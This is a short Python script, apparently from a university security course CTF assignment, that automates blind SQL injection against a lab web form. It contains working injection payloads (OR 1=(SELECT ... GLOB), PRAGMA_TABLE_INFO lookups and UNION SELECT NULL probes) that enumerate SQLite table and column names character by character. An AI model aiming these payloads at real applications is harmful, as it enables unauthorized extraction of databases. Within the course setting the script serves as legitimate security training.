# Used for NUS CS2107 AY23/24 Assignment 2
import requests

url = "http://cs2107-ctfd-i.comp.nus.edu.sg:8082/catbreed"


ascii_set = "0123456789"
for x in range(65, 126):
    ascii_set += chr(x)

ascii_set += "*"

def table(table):
    counter = 0
    
    while counter < len(ascii_set):
        for c in ascii_set:
            counter += 1
            query = "' OR 1=(SELECT 1 FROM sqlite_schema WHERE name GLOB '"
            data = query + table + c + "*'); -- "

            r = requests.post(url, data={"breed":data})
            if 'Cat breed exists!' in r.text:
                table = table + c
                counter = 0
                break

        if table[-2:] == "**":
            table = table[:-2]
            break

    if (len(table) < 3) or (table[0] == "*"):
        return ""
    else:
        return table

def columns(table):
    nullquery = "' UNION SELECT"
    nullable = " NULL"
    for i in range(1, 10):
        nulldata = nullquery + nullable + " FROM " + table +";--"
        s = requests.post(url, data={"breed":nulldata})


        if 'Cat breed exists!' in s.text:
            break
        nullable += ",NULL "
    

    #print(f"table: {table}")
    #print(f"Number of Cols: {i}")
    return i


def colName(tablename, col):
    
    counter = 0

    while counter < len(ascii_set):
        for c in ascii_set:
            counter += 1
            colquery = "' OR 1=(SELECT 1 FROM PRAGMA_TABLE_INFO('"+tablename+"') WHERE name GLOB '"
            coldata = colquery + col + c + "*'); -- "

            colres = requests.post(url, data={"breed":coldata})

            if 'Cat breed exists!' in colres.text:
                col = col + c
                counter = 0
                break
    
        if col[-2:] == "**":
            col = col[:-2]
            break

    if (len(col) > 1 and col[0] != "*"):
        return col
    else:
        return ""
        



if __name__ == '__main__':

    for i in range(len(ascii_set)):
        colarray = []
        t = table(ascii_set[i])

        if (t != ""):
            #c = columns(t)
            for i in range(len(ascii_set)):
                col = colName(t,ascii_set[i]);
                if (col != ""):
                    colarray.append(col)


            print(f"table: {t}")
            print(f"columns: {colarray}\n")
            


        






